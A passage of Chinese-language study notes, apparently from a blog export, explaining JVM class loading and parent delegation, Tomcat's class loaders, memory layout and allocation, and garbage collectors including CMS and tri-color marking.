\n对应class实例的引用：类加载器在加载类信息放到方法区中后，会创建一个对应的Class 类型的对象实例放到堆(Heap)中, 作为开发人员访问方法区中类定义的入口和切入点。 \n注意，主类在运行过程中如果使用到其它类，会逐步加载这些类。 \njar包或war包里的类不是一次性全部加载的，是使用到时才加载。\n类加载器和双亲委派机制上面的类加载过程主要是通过类加载器来实现的，Java里有如下几种类加载器 \n\n引导类加载器：负责加载支撑JVM运行的位于JRE的lib目录下的核心类库，比如 rt.jar、charsets.jar等 \n\n扩展类加载器：负责加载支撑JVM运行的位于JRE的lib目录下的ext扩展目录中的JAR类包\n\n应用程序类加载器：负责加载ClassPath路径下的类包，主要就是加载你自己写的那些类\n\n自定义加载器：负责加载用户自定义路径下的类包\n\n\n大部分核心类都是由引导类加载器加载的！\n双亲委派机制，并不是说ApplicationClassLoad的父类是扩展类加载器\n而是ApplicationClassLoad的Parent的属性是扩展类加载器！！\n\n具体流程\n先是应用程序类加载器查看该类是否被加载了。如果被加载了就直接返回，否则会开始加载类的流程\n加载类的时候先是委托parent来加载——是依靠native（c++）代码\n此时到达扩展类加载器了，他是没有parent，一般是通过findBootstrapClassOrNull来加载引导类加载器。同样是native c++方法\n现在就到达引导类加载器了，接下来往下走。\n由于夫属性没有加载到类，所以返回空，所以本类看是否可以加载到类，加载不到，返回空\n依次这样。\n//ClassLoader的loadClass方法 protected Class&lt;?&gt; loadClass(String name, boolean resolve)        throws ClassNotFoundException    &#123;        synchronized (getClassLoadingLock(name)) &#123;            // First, check if the class has already been loaded            Class&lt;?&gt; c = findLoadedClass(name);            //已经加载的类中找不到            if (c == null) &#123;                long t0 = System.nanoTime();                try &#123;                    if (parent != null) &#123;                        //如果有父亲就调用父亲来加载                        c = parent.loadClass(name, false);                    &#125; else &#123;                        //如果没有父亲就依靠引导类加载器加载                        c = findBootstrapClassOrNull(name);                    &#125;                &#125; catch (ClassNotFoundException e) &#123;                    // ClassNotFoundException thrown if class not found                    // from the non-null parent class loader                &#125;                if (c == null) &#123;                // If still not found, then invoke findClass in order                // to find the class.                long t1 = System.nanoTime();                //这里就是依靠自己来加载了。【自定义加载器就是在这里处理的                c = findClass(name);                // this is the defining class loader; record the stats                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);                sun.misc.PerfCounter.getFindClasses().increment();            &#125;        &#125;        if (resolve) &#123;            resolveClass(c);        &#125;        return c;    &#125;&#125;\n为什么要设计双亲委派机制？沙箱安全机制：\n自己写的java.lang.String.class类不会被加载，这样便可以防止核心API库被随意篡改 \n【注意到包名和实际的String的包名是一致的\n避免类的重复加载：\n当父亲已经加载了该类时，就没有必要子ClassLoader再加载一次，保证被加载类的唯一性 \n父亲加载了，就不需要子加载器再加载【比如 委托给父亲，加载成功就会直接返回。而不会使得子加载器再加载\n【每个类加载器可能有相似的类，但是只会加载一份\n全盘负责委托机制 \n“全盘负责”是指当一个ClassLoder装载一个类时，除非显示的使用另外一个ClassLoder，该类所依赖及引用的类也由这个ClassLoder载入。\n也就是说，当我们进行加载某个A类的时候，使用的App加载器，而A类中有静态的B类变量，则需要加载B类。这个时候一样由刚刚的App加载器来加载。\n自定义类加载器： \n自定义类加载器只需要继承 java.lang.ClassLoader 类，该类有两个核心方法，一个是loadClass(String, boolean)，实现了双亲委派机制，还有一个方法是findClass，默认实现是空方法，所以我们自定义类加载器主要是重写findClass方法。 \n根据上面的源码可以很清晰的看到为什么是修改findClass方法。\n打破双亲委派机制其实很简单，只要我们修改加载器的源码【或者自定义加载器就可以\n也就是在自定义类加载器的基础上，重写loadClass方法\nif (c == null) &#123;             long t0 = System.nanoTime();             try &#123;                 if (parent != null) &#123;                     //这里就是双亲委派的原理！！！！！！！！！！                     c = parent.loadClass(name, false);                 &#125; else &#123;                     c = findBootstrapClassOrNull(name);                 &#125;             &#125; catch (ClassNotFoundException e) &#123;                 // ClassNotFoundException thrown if class not found                 // from the non-null parent class loader             &#125;             if (c == null) &#123;                 // If still not found, then invoke findClass in order                 // to find the class.                 long t1 = System.nanoTime();                 c = findClass(name);                 // this is the defining class loader; record the stats                 sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);                 sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);                 sun.misc.PerfCounter.getFindClasses().increment();             &#125;         &#125;\n\nTomacat打破双亲委派机制Tomcat是一个web容器，那么他需要解决什么问题？\n\n一个web容器可能需要部署两个应用程序，不同的应用程序可能会依赖同一个第三方类库的不同版本，不能要求同一个类库在同一个服务器只有一份，因此要保证每个应用程序的类库都是独立的，保证相互隔离。 \n\n部署在同一个web容器中相同的类库相同的版本可以共享。否则，如果服务器有10个应用程序，那么要有10份相同的类库加载进虚拟机。 \n\nweb容器也有自己依赖的类库，不能与应用程序的类库混淆。基于安全考虑，应该让容器的类库和程序的类库隔离开来。 \n\nweb容器要支持jsp的修改，我们知道，jsp 文件最终也是要编译成class文件才能在虚拟机中运行，但程序运行后修改jsp已经是司空见惯的事情， web容器需要支持 jsp 修改后不用重启。\n\n\n总的来说：\n\n版本不同类需要被加载\n共享类\nweb有自己的类，不能被混淆\njsp会存在修改的问题【感觉很少用jsp了\n\n那么显然双亲委派机制不能解决上述问题\n\n第一个问题，如果使用默认的类加载器机制，那么是无法加载两个相同类库的不同版本的，默认的类加器是不管你是什么版本的，只在乎你的全限定类名，并且只有一份。 \n\n第二个问题，默认的类加载器是能够实现的，因为他的职责就是保证唯一性。 \n\n第三个问题和第一个问题一样。 \n\n我们再看第四个问题，我们想我们要怎么实现jsp文件的热加载，jsp 文件其实也就是class文件，那么如果修改了，但类名还是一样，类加载器会直接取方法区中已经存在的，修改后的jsp是不会重新加载的。那么怎么办呢？我们可以直接卸载掉这jsp文件的类加载器，所以你应该想到了，每个jsp文件对应一个唯一的类加载器，当一个jsp文件修改了，就直接卸载这个jsp类加载器。重新创建类加载器，重新加载jsp文件。\n\n\n\n最后tomcat使用的加载机制就是如上图所示\n解释下各个加载器的作用\n\ncommonLoader：Tomcat最基本的类加载器，加载路径中的class可以被Tomcat容器本身以及各个Webapp共享访问； \n\ncatalinaLoader：Tomcat容器私有的类加载器，加载路径中的class对于Webapp不可见；\n\nsharedLoader：各个Webapp共享的类加载器，加载路径中的class对于所有Webapp可见，但是对于Tomcat容器不可见； \n\nWebappClassLoader：各个Webapp私有的类加载器，加载路径中的class只对当前Webapp可见，比如加载war包里相关的类，每个war包应用都有自己的WebappClassLoader，实现相互隔离，比如不同war包应用引入了不同的spring版本，\n\n\n这样实现就能加载各自的spring版本； \n很显然，commonLoader解决了公有类库的共用问题，catalinaLoader解决了Tomcat自己的类加载独立\nsharedLoader支持了仅仅Webapp所需的共享类问题,WebappClassLoader解决了对应的当前Webapp的类加载问题。\n\n注意：同一个JVM内，两个相同包名和类名的类对象可以共存，因为他们的类加载器可以不一样，所以看两个类对象是否是同一个，除了看类的包名和类名是否都相同之外，还需要他们的类加载器也是同一个才能认为他们是同一个。 \nJVM整体结构JDK体系结构\n而java语言的跨平台特性是在于JVM对不同的操作系统有不同的机器码指令\n足以见得JVM的重要性\nJVM整体结构及内存模型\n总的来说，大方面JVM虚拟机分三个部分：类加载系统、执行引擎、运行时数据区。\n而具体看运行时数据区中，分为五个部分，分别是\n堆、方法区。\n（虚拟机）栈、本地方法栈、程序计数器。【每个线程独有的，不会共享\n运行时数据区- 堆\n堆的话，存放的是对象实例\n里面的话分为年轻代和老年代【1&#x2F;3  2&#x2F;3】\n运行时数据区- 方法区\n方法区内存放的都是一些常量、静态变量、类信息。\n这些是可以看作gc-root的\n运行时数据区-（虚拟机）栈\n栈中是栈帧【也就是一个又一个的方法。\n栈帧中存放的：局部变量表、操作数栈、动态链接、方法出口。\n局部变量表和操作数栈是可以看做一个组合。\n比如int a = 3  a被放在局部变量表，3在操作数栈，然后把3弹出给a赋值。\n注意：如果局部变量表是引用的对象，那么存放的是地址\n动态链接：对应的符号引用的实际地址存放在这里\n方法出口：就类似本方法结束后，在原方法中从哪里开始继续运行\n运行时数据区-本地方法栈\n这是提供个c++程序所需要的内存，帮助我们使用本地方法-也就是c++方法。\n运行时数据区-程序计数器\n就和计组的PC一样\nJVM内存参数设置\nSpring Boot程序的JVM参数设置格式(Tomcat启动直接加在bin目录下catalina.sh文件里)： \njava ‐Xms2048M ‐Xmx2048M ‐Xmn1024M ‐Xss512K ‐XX:MetaspaceSize=256M ‐XX:MaxMetaspaceSize=256M ‐jar microservice‐eureka‐server.jar  \n关于元空间的JVM参数有两个：-XX:MetaspaceSize=N和-XX:MaxMetaspaceSize=N\n-XX：MaxMetaspaceSize： 设置元空间最大值， 默认是-1， 即不限制， 或者说只受限于本地内存大小。 \n-XX：MetaspaceSize： 指定元空间触发Fullgc的初始阈值(元空间无固定初始大小)， 以字节为单位，默认是21M，达到该值就会触发full gc进行类型卸载， 同时收集器会对该值进行调整： 如果释放了大量的空间， 就适当降低该值； 如果释放了很少的空间， 那么在不超过-XX：MaxMetaspaceSize（如果设置了的话） 的情况下， 适当提高该值。这个跟早期jdk版本的**-XX:PermSize**参数意思不一样，- \nXX:PermSize代表永久代的初始容量。 \n由于调整元空间的大小需要Full GC，这是非常昂贵的操作，如果应用在启动的时候发生大量Full GC，通常都是由于永久代或元空间发生了大小调整，基于这种情况，一般建议在JVM参数中将MetaspaceSize和MaxMetaspaceSize设置成一样的值，并设置得比初始值要大,对于8G物理内存的机器来说，一般我会将这两个值都设置为256M。 \nTip\n关于-Xss的设置\n这是对一个线程的栈大小设置。一般来说-Xss越小count值越小，说明一个线程栈里能分配的栈帧就越少，但是对JVM整体来说能开启的线程数会更多。\n大量的jvm参数设置在后面会写\nJVM内存分配机制基本流程\n1.类加载检查\n虚拟机遇到一条new指令时，首先将去检查这个指令的参数是否能在常量池中定位到一个类的符号引用，并且检查这个符号引用代表的类是否已被加载、解析和初始化过。如果没有，那必须先执行相应的类加载过程。 \nnew指令对应到语言层面上讲是，new关键词、对象克隆、对象序列化等。 \n2.分配内存 \n在类加载检查通过后，接下来虚拟机将为新生对象分配内存。对象所需内存的大小在类加载完成后便可完全确定，为对象分配空间的任务等同于把 一块确定大小的内存从Java堆中划分出来。 \n这个步骤有两个问题： \n1.如何划分内存。 \n2.在并发情况下，可能出现正在给对象A分配内存，指针还没来得及修改，对象B又同时使用了原来的指针来分配内存的情况。 \n划分内存的方法： \n“指针碰撞”（Bump the Pointer）(默认用指针碰撞) \n如果Java堆中内存是绝对规整的，所有用过的内存都放在一边，空闲的内存放在另一边，中间放着一个指针作为分界点的指示器，那所分配内存就仅仅是把那个指针向空闲空间那边挪动一段与对象大小相等的距离。 \n相当于移动点位的方式\n“空闲列表”（Free List） \n如果Java堆中的内存并不是规整的，已使用的内存和空闲的内存相互交错，那就没有办法简单地进行指针碰撞了，虚拟机就必须维护一个列表，记录上哪些内存块是可用的，在分配的时候从列表中找到一块足够大的空间划分给对象实例，并更新列表上的记录。\n使用表结构记录可用空间，和os类似\n解决并发问题的方法： \nCAS（compare and swap） \n虚拟机采用CAS配上失败重试的方式保证更新操作的原子性来对分配内存空间的动作进行同步处理。 \n本地线程分配缓冲（Thread Local Allocation Buffer,TLAB）\n把内存分配的动作按照线程划分在不同的空间之中进行，即每个线程在Java堆中预先分配一小块内存。通过­XX:+&#x2F;­UseTLAB参数来设定虚拟机是否使用TLAB(JVM会默认开启­XX:+UseTLAB)，­XX:TLABSize 指定TLAB大小。 \nTLAB是会在堆中根据线程分配一定空间，当然，TLAB分配的空间是有限的，如果需要分配的空间大于就会使用CAS方式来处理。\n3.初始化 \n内存分配完成后，虚拟机需要将分配到的内存空间都初始为零值（不包括对象头）， 如果使用TLAB，这一工作过程也可以提前至TLAB分配时进行。这一步操作保证了对象的实例字段在Java代码中可以不赋初始值就直接使用，程序能访问到这些字段的数据类型所对应的零值。 \n4.设置对象头 \n\n初始化零值之后，虚拟机要对对象进行必要的设置，例如这个对象是哪个类的实例、如何才能找到类的元数据信息、对象的哈希码、对象的GC分代年龄等信息。这些信息存放在对象的对象头Object Header之中。 \n在HotSpot虚拟机中，对象在内存中存储的布局可以分为3块区域：\n对象头（Header）、 实例数据（Instance Data）和对齐填充（Padding）。\n HotSpot虚拟机的对象头包括两部分信息 \n第一部分用于存储对象自身的运行时数据， 如哈希码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程ID、偏向时间戳等。\n对象头的另外一部分是类型指针，即对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例。\n\n5.执行方法 \n执行&lt;init&gt;方法，即对象按照程序员的意愿进行初始化。对应到语言层面上讲，就是为属性赋值（注意，这与上面的赋零值不同，这是由程序员赋的值），和执行构造方法。\n注意到：分配内存、初始化、设置对象头、执行方法都是在类加载之后发生的。\n\n在看到对象头大小和查阅的时候，会发现\n存在某某对象指针压缩的情况。例如\n 24 4 java.lang.Object A.o null\n可以看到类型指针的大小为4个字节，被压缩了。\n什么是java对象的指针压缩？ \n1.jdk1.6 update14开始，在64bit操作系统中，JVM支持指针压缩 \n2.jvm配置参数:UseCompressedOops，compressed­­压缩、oop(ordinary object pointer)­­对象指针 \n3.启用指针压缩:­XX:+UseCompressedOops(默认开启)，禁止指针压缩:­XX:­UseCompressedOops \n为什么要进行指针压缩？ \n1.在64位平台的HotSpot中使用32位指针，内存使用会多出1.5倍左右，使用较大指针在主内存和缓存之间移动数据,占用较大宽带，同时GC也会承受较大压力\n2.为了减少64位平台下内存的消耗，启用指针压缩功能 \n3.在jvm中，32位地址最大支持4G内存(2的32次方)，可以通过对对象指针的压缩编码、解码方式进行优化，使得jvm只用32位地址就可以支持更大的内存配置(小于等于32G) \n4.堆内存小于4G时，不需要启用指针压缩，jvm会直接去除高32位地址，即使用低虚拟地址空间 \n5.堆内存大于32G时，压缩指针会失效，会强制使用64位(即8字节)来对java对象寻址，这就会出现1的问题，所以堆内存不要大于32G为好 \n对象内存分配\n对象栈上分配我们知道对象在堆上分配内存，当对象没有被引用的时候，依靠GC进行回收内存，如果对象数量较多的时候，就会给GC带来较大的压力。\n为了减少临时对象在堆内分配的数量，JVM通过逃逸分析确定该对象不会被外部访问，那么就可以将该对象在栈上分配内存，这样该对象所占用的内存空间就可以随帧而销毁，减轻了垃圾回收的压力。\n对象逃逸分析：就是分析对象动态作用域，当一个对象在方法中被定义后，它可能被外部方法所引用，例如作为调用参 数传递到其他地方中。\nJVM对于这种情况可以通过开启逃逸分析参数(-XX:+DoEscapeAnalysis)来优化对象内存分配位置，使其通过标量替换优先分配在栈上(栈上分配)，JDK7之后默认开启逃逸分析，如果要关闭使用参数(-XX:-DoEscapeAnalysis) 。\n标量替换：通过逃逸分析确定该对象不会被外部访问，并且对象可以被进一步分解时，JVM不会创建该对象，而是将该对象成员变量分解若干个被这个方法使用的成员变量所代替，这些代替的成员变量在栈帧或寄存器上分配空间，这样就不会因为没有一大块连续空间导致对象内存不够分配。开启标量替换参数(-XX:+EliminateAllocations)，JDK7之后默认开启。 \n标量与聚合量：标量即不可被进一步分解的量，而JAVA的基本数据类型就是标量（如：int，long等基本数据类型以及reference类型等），标量的对立就是可以被进一步分解的量，而这种量称之为聚合量。而在JAVA中对象就是可以被进一步分解的聚合量。\n综上：栈上分配依赖于逃逸分析和标量替换\n\n对象在Eden区分配大多数情况下，对象在新生代中 Eden 区分配。当 Eden 区没有足够空间进行分配时，虚拟机将发起一次Minor GC。\n我们先来看看 Minor GC和-Full GC 有什么不同呢？ \nMinor GC&#x2F;Young GC：指发生新生代的的垃圾收集动作，Minor GC非常频繁，回收速度一般也比较快。 \nMajor GC&#x2F;Full GC：一般会回收老年代 ，年轻代，方法区的垃圾，Major GC的速度一般会比Minor GC的慢 \n10倍以上。 \nEden与Survivor区默认8:1:1 \n大量的对象被分配在eden区，eden区满了后会触发minor gc，可能会有99%以上的对象成为垃圾被回收掉，剩余存活的对象会被挪到为空的那块survivor区，下一次eden区满了后又会触发minor gc，把eden区和survivor区垃圾对象回收，把剩余存活的对象一次性挪动到另外一块为空的survivor区，因为新生代的对象都是朝生夕死的，存活时间很短，所以JVM默认的8:1:1的比例是很合适的，让eden区尽量的大，survivor区够用即可， \nJVM默认有这个参数-XX:+UseAdaptiveSizePolicy(默认开启)，会导致这个8:1:1比例自动变化，如果不想这个比例有变化可以设置参数-XX:-UseAdaptiveSizePolicy \n长期存活的对象将进入老年代既然虚拟机采用了分代收集的思想来管理内存，那么内存回收时就必须能识别哪些对象应放在新生代，哪些对象应放在老年代中。为了做到这一点，虚拟机给每个对象一个对象年龄（Age）计数器。 \n如果对象在 Eden 出生并经过第一次 Minor GC 后仍然能够存活，并且能被 Survivor 容纳的话，将被移动到 Survivor空间中，并将对象年龄设为1。对象在 Survivor 中每熬过一次 MinorGC，年龄就增加1岁，当它的年龄增加到一定程度（默认为15岁，CMS收集器默认6岁，不同的垃圾收集器会略微有点不同），就会被晋升到老年代中。对象晋升到老年代的年龄阈值，可以通过参数 -XX:MaxTenuringThreshold 来设置。 \n对象动态年龄判断[重要！！]当前放对象的Survivor区域里(其中一块区域，放对象的那块s区)，一批对象的总大小大于这块Survivor区域内存大小的50%(-XX:TargetSurvivorRatio可以指定)，那么此时大于等于这批对象年龄最大值的对象，就可以直接进入老年代了。【如果总大小大于survivor的50%，那么直接进入老年代\n例如Survivor区域里现在有一批对象，**年龄1+年龄2+年龄n的多个年龄对象总和超过了Survivor区域的50%**，此时就会把年龄n(含)以上的对象都放入老年代。\n这个规则其实是希望那些可能是长期存活的对象，尽早进入老年代。对象动态年龄判断机制一般是在minor gc之后触发的。 \n老年代空间分配担保机制图已经说明了一切\n\n年轻代每次minor gc之前JVM都会计算下老年代剩余可用空间 \n如果这个可用空间小于年轻代里现有的所有对象大小之和(包括垃圾对象) \n就会看一个-XX:-HandlePromotionFailure(jdk1.8默认就设置了)的参数是否设置了 \n如果有这个参数，就会看看老年代的可用内存大小，是否大于之前每一次minor gc后进入老年代的对象的平均大小。 \n如果上一步结果是小于或者之前说的参数没有设置，那么就会触发一次Full gc，对老年代和年轻代一起回收一次垃圾， 如果回收完还是没有足够空间存放新的对象就会发生”OOM” 。\n注意到是如果老年代剩余空间不够可能进入老年代的值，那么会触发full GC。\n据说这样可以剩下一次minor GC。\n当然，如果minor gc之后剩余存活的需要挪动到老年代的对象大小还是大于老年代可用空间，那么也会触发full gc，fullgc完之后如果还是没有空间放minor gc之后的存活对象，则也会发生“OOM”\n对象内存回收堆中几乎放着所有的对象实例，对堆垃圾回收的第一步就是要判断哪些对象已经死亡。\n引用计数法给对象中添加一个引用计数器，每当有一个地方引用它，计数器就加1；当引用失效，计数器就减1；任何时候计数器为0的对象就是不可能再被使用的。 \n这个方法实现简单，效率高，但是目前主流的虚拟机中并没有选择这个算法来管理内存，其最主要的原因是它很难解决对象之间相互循环引用的问题。 \n所谓对象之间的相互引用问题，如下面代码所示：除了对象objA 和 objB 相互引用着对 方之外，这两个对象之间再无任何引用。但是他们因为互相引用对方，导致它们的引用计数器都不为0，于是引用计数算法无法通知 GC 回收器回收他们。 \npublic class ReferenceCountingGc &#123;      Object instance = null;     public static void main(String[] args) &#123;         ReferenceCountingGc objA = new ReferenceCountingGc();         ReferenceCountingGc objB = new ReferenceCountingGc();         objA.instance = objB;         objB.instance = objA;         objA = null;         objB = null;     &#125; &#125;\n\n可达性分析将“GC Roots” 对象作为起点，从这些节点开始向下搜索引用的对象，找到的对象都标记为非垃圾对象，其余未标记的对象都是垃圾对象 \nGC Roots根节点：线程栈的局部变量表、动态链接、方法区（元空间）静态变量、常量、本地方法栈的变量等等 \n\n常见引用类型java的引用类型一般分为四种：强引用、软引用、弱引用、虚引用 \n强引用：普通的变量引用 \npublic static User user &#x3D; new User(); \n软引用：将对象用SoftReference软引用类型的对象包裹，正常情况不会被回收，但是GC做完后发现释放不出空间存放新的对象，则会把这些软引用的对象回收掉。软引用可用来实现内存敏感的高速缓存。 \npublic static SoftReference&lt;User&gt; user = new SoftReference&lt;User&gt;(new User()); \n软引用在实际中有重要的应用，例如浏览器的后退按钮。按后退时，这个后退时显示的网页内容是重新进行请求还是从缓存中取出呢？这就要看具体的实现策略了。 \n（1）如果一个网页在浏览结束时就进行内容的回收，则按后退查看前面浏览过的页面时，需要重新构建 \n（2）如果将浏览过的网页存储到内存中会造成内存的大量浪费，甚至会造成内存溢出 \n弱引用：将对象用WeakReference软引用类型的对象包裹，弱引用跟没引用差不多，GC会直接回收掉，很少用 \npublic static WeakReference&lt;User&gt; user = new WeakReference&lt;User&gt;(new User()); \n虚引用：虚引用也称为幽灵引用或者幻影引用，它是最弱的一种引用关系，几乎不用 \nfinalize()方法最终判定对象是否存活即使在可达性分析算法中不可达的对象，也并非是“非死不可”的，这时候它们暂时处于“缓刑”阶段，要真正宣告一个对象死亡，至少要经历再次标记过程。 \n标记的前提是对象在进行可达性分析后发现没有与GC Roots相连接的引用链。 \n1. 第一次标记并进行一次筛选。 \n筛选的条件是此对象是否有必要执行finalize()方法。 \n当对象没有覆盖finalize方法，对象将直接被回收。 \n2. 第二次标记 \n如果这个对象覆盖了finalize方法，finalize方法是对象脱逃死亡命运的最后一次机会，如果对象要在finalize()中成功拯救自己，只要重新与引用链上的任何的一个对象建立关联即可，譬如把自己赋值给某个类变量或对象的成员变量，那在第二次标记时它将移除出“即将回收”的集合。如果对象这时候还没逃脱，那基本上它就真的被回收了。 \n注意：\n一个对象的finalize()方法只会被执行一次，也就是说通过调用finalize方法自我救命的机会就一次。 \n并且要在重写finalize()方法中写下执行自救的操作\n如何判断一个类是无用的类方法区主要回收的是无用的类，那么如何判断一个类是无用的类的呢？ \n类需要同时满足下面3个条件才能算是 “无用的类” ： \n\n该类所有的实例都已经被回收，也就是 Java堆中不存在该类的任何实例。 \n加载该类的 ClassLoader 已经被回收。 \n该类对应的 java.lang.Class 对象没有在任何地方被引用，无法在任何地方通过反射访问该类的方法。\n\n","tags":["2021"]},{"title":"JVM垃圾收集器","url":"/2021/04/14/2021/JVM%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8/","content":"\n\n垃圾收集算法java的特点之一，垃圾收集。\n垃圾收集有四种算法，分别是标记清楚、标记整理、复制、分代收集。\n总的来说分代收集其实就是老年代和新生代用不同的垃圾收集算法而已。\n比如新生代中，每次收集都会有大量对象死去，所以可以选择复制算法，只需要付出少量对象的复制成本就可以完成垃圾收集。\n而老年代的对象存货几率是比较高的，没有额外的空间进行分配担保，所以我们必须选择标记-清除或者标记-整理算法进行垃圾收集。\n注意，复制算法比另外的两种算法快10倍左右。\n至于这四个算法的具体流程，我觉得就不必要说了。大体上都清楚。\n垃圾收集器\n垃圾收集算法是内存回收的方法论，而垃圾收集器则是内存回收的具体实现。\n目前并没有万能的垃圾收集器，我们能做的是根据具体的应用场景来选择合适的垃圾收集器。\nSerial收集器（-XX:+UseSerialGC -XX:+UseSerialOldGC）Serial收集器是最基本、历史最悠久的垃圾收集器。\n顾名思义，这是一个单线程的垃圾收集器。他只会使用一条垃圾收集线程来完成垃圾收集的工作。\n更为重要的是，他在进行垃圾收集工作的时候必须暂停其他所有的工作线程（Stop The World），直到它收集结束。\n\n使用这个垃圾收集器的话，新生代采用复制算法，老年代使用标记整理算法。\n显而易见的是，STW操作对用户的体验感很差。\nSerial Old收集器是Serial收集器的老年代版本，它同样是一个单线程收集器。\n他有两大用途：\n1、在JDK1.5以及以前的版本中与Parallel Savenge收集器搭配使用\n2、作为CMS收集器的备用方案\nParallel Scavenge收集器-XX:+UseParallelGC   -XX:+UseParallelOldGC\nParallel收集器其实就i是Serial收集器的多线程版本，除了使用多线程进行垃圾回收之外，其他行为和Serial收集器类似。默认的收集线程和CPU核数一致。\nParallel收集器关注点是吞吐量，也就是高效率的使用CPU。而CMS更加关注于用户体验，也就是尽可能的是用户线程停顿时间短。\n\n新生代采用复制算法，老年代采用标记-整理算法\nParallel Old收集器是Parallel Scavenge收集器的老年代版本。\n使用多线程和标记整理算法，在注重吞吐连和CPU资源的场合，可以优先考虑Parallel Scavenge收集器和Parallel Old收集器。这也是JDK1.8默认的垃圾收集器\nParNew收集器-XX:+UseParNewGC\n其实ParNew收集器跟Parallel收集器很类似，区别主要在于它可以和CMS收集器配合使用\n新生代采用复制算法，老年代采用标记-整理算法\n\n注意：只有他才能和CMD收集器配合工作\nCMS收集器-XX:+UseConcMarkSweepGC(old)\nCMS收集器是一种以获取最短回收停顿时间为目标的收集器。它非常看重用户的体验感。\n它第一次实现了让垃圾收集线程和用户线程基本上同时工作\nCMS收集器是一种“标记-清除算法”。它相对来说更为复杂一点。\n主要分为四个步骤：\n\n初始标记：在这个阶段会暂停其他线程，并记录下gc root直接能引用的对象，速度较快。\n并发标记：这个阶段会从Gc Roots的直接关联对象开始遍历整个对象图的过程，这个过程耗时较长，但是不需要暂停用户线程。\n重新标记：重新标记阶段是为了修正并发标记期间因为用户程序进行运行而导致标记产生变动的那一部分的标记记录，这一阶段时间相对初始标记会长一些，但是远远比并发标记短！这里的主要算法是三色标记算法。\n并发清理：开启用户线程，同时GC线程开始对未标记的区域做清扫。这个阶段出现新增对象会标记为黑色对象。\n并发重置：对该次CMS垃圾回收中的数据结构进行重置，以便下次进行CMS。\n\n\n总的来说，我们可以看到垃圾收集线程是一致在工作的，而用户线程仅仅是在初始标记和重新标记的时候没有工作。\n故而我们可以看到这个用户对于这个的体验应该是很好的，没有大量的STW产生！\nCMS的主要优点也就出来了：并发收集、低停顿！\nCMS的相关核心参数 \n\n-XX:+UseConcMarkSweepGC：启用cms \n\n-XX:ConcGCThreads：并发的GC线程数 \n\n-XX:+UseCMSCompactAtFullCollection：FullGC之后做压缩整理（减少碎片） \n\n-XX:CMSFullGCsBeforeCompaction：多少次FullGC之后压缩一次，默认是0，代表每次FullGC后都会压缩一次\n\n-XX:CMSInitiatingOccupancyFraction: 当老年代使用达到该比例时会触发FullGC（默认是92，这是百分比） \n\n-XX:+UseCMSInitiatingOccupancyOnly：只使用设定的回收阈值(-XX:CMSInitiatingOccupancyFraction设定的值)，如果不指定，JVM仅在第一次使用设定值，后续则会自动调整 \n\n-XX:+CMSScavengeBeforeRemark：在CMS GC前启动一次minor gc，目的在于减少老年代对年轻代的引 用，降低CMS GC的标记阶段时的开销，一般CMS的GC耗时 80%都在标记阶段 \n\n-XX:+CMSParallellnitialMarkEnabled：表示在初始标记的时候多线程执行，缩短STW \n\n-XX:+CMSParallelRemarkEnabled：在重新标记的时候多线程执行，缩短STW;\n\n\n然而由于在并发标记的过程中\n可能出现原来被认为不是垃圾的又变成垃圾了，这就是多标——浮动垃圾。\n多标-浮动垃圾多标浮动垃圾在本轮GC中不会回收这部分内存，浮动垃圾不会影响垃圾回收的正确性，只需要等到下一轮垃圾回收中才被清除。\n此外，针对并发标记（还有并发清理）开始后产生的新对象是，通常的做法是直接全部标记为黑色，本轮不会清除，委托给下一轮的GC，它也可以被称为浮动垃圾\n除了多标外，还存在一种情况——漏标。\n漏标的具体解决在后续述说。\n三色标记算法三色标记算法是CMS垃圾收集器的底层原理。\n在并发标记的过程中，因为标记期间用户线程还在跑，对象之间的引用可能出现变化，多标和漏标的情况就有可能发生。注意我们前面说了多标的解决方法【其实委托给下一次GC就好啦\n这里说下三色标记的三色说法：\n我们把GcRoots可达性分析遍历对象过程中遇到的对象。按照“是否访问过”，标记成三种颜色：\n\n黑色：表示对象已经被垃圾收集器访问过，且这个对象的所有引用都已经被扫描过。黑色对象代表已经扫描过了，他是安全存活的！【我认为的是：该个对象的所有属性被扫描过了，它自己也被扫描过了！\n灰色：表示对象已经被垃圾收集器访问过了，但是这个对象上至少存在一个引用还没有被扫描过。\n白色：表示对象尚未被垃圾收集器访问过。显然在可达性分析一开始，所有的对象都是白色的。\n\n\n显而易见，灰色是一个中间态，最终整个老年代会变成黑白色。\n根据CMS垃圾收集器，说下算法流程：\n首先初始标记，会标记处GcRroots直接引用的对象。标记会黑色\n接下来进行并发标记，开始可达性分析算法，会出现灰色和黑色！\n在并发标记的过程会出现多标、漏标问题\n所以进行重新标记把漏标问题解决。\n最后并发清理，清理掉所以的白色对象。再进行并发重置，把相应的数据结构重置。\n漏标-读写屏障漏标是因为：在灰色状态下，用户线程是继续执行的，那么可能某些引用会被当作垃圾误删，这是很严重的bug。\n常见的两种解决办法：增量更新、原始快照\n增量更新IU当黑色对象插入新的指向白色对象的引用关系时，就将这个新插入的引用记录下来，等并发扫描结束之后，再将这些记录过的引用关系中黑色对象为根，重新扫描一次。\n简而言之，就是如果出现黑色对象插入新的对象时，这个新的对象是白色的，那么我们就把黑色对象记录下来。\n原始快照-SATB原始快照就是当灰色对象要删除指向白色对象的引用关系时，就将这个要删除的引用记录下来。\n在并发扫描结束之后，把这个记录中白色对象变成黑色，成为浮动垃圾，留给下一次的GC处理。\n以上无论时对引用关系记录的插入还是删除，虚拟机的记录操作都是通过写屏障实现的。\n读写屏障就是在写入和读入的前后可以进行处理操作，这些操作就被称为屏障。\n\n现代追踪式（可达性分析）的垃圾回收器几乎都借鉴了三色标记的算法思想，尽管实现的方式不尽相同：比如白色&#x2F;黑色集合一般都不会出现（但是有其他体现颜色的地方）、灰色集合可以通过栈&#x2F;队列&#x2F;缓存日志等方式进行实现、遍历方式可以是广度&#x2F;深度遍历等等。 \n对于读写屏障，以Java HotSpot VM为例，其并发标记时对漏标的处理方案如下： \nCMS：写屏障 + 增量更新  \nG1，Shenandoah：写屏障 + SATB \nZGC：读屏障 